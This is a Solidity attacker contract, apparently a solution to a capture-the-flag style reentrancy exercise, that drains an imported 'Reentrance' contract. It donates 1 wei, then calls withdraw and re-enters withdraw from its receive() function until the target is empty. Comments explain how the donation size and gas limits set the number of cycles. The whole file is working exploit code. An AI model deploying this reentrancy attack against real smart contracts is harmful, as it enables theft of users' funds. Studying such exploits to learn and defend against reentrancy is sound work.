// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./Reentrance.sol";

contract AttackingReentrance {
    address payable public contractAddress;

    constructor(address payable _contractAddress) payable {
        contractAddress = _contractAddress;
    }

    function hackContract() external {
        // Donate to guarantee a balance >= 1 (we're draining the contract but let's still be a cheap asshole and pass the minimum 1 wei)
        // It's worth noting we would need to pass a higher donation if `Reentrance`'s balance were higher - our donation will determine how many
        // reentrancy cycles will run - if this were too many, we'd run out of gas eventually
        // Since this test case runs only 5 times (because test case funds the contract with 5 wei), we'e good to go
        Reentrance(contractAddress).donate{value: 1}(address(this));
        // Call withdraw to start the reentrancy cycle
        Reentrance(contractAddress).withdraw();
    }

    receive() external payable {
        // Drain it all!
        // Since `Reentrance` uses `call`, no error is ever thrown or checked so function there won't revert
        Reentrance(contractAddress).withdraw();
    }
}
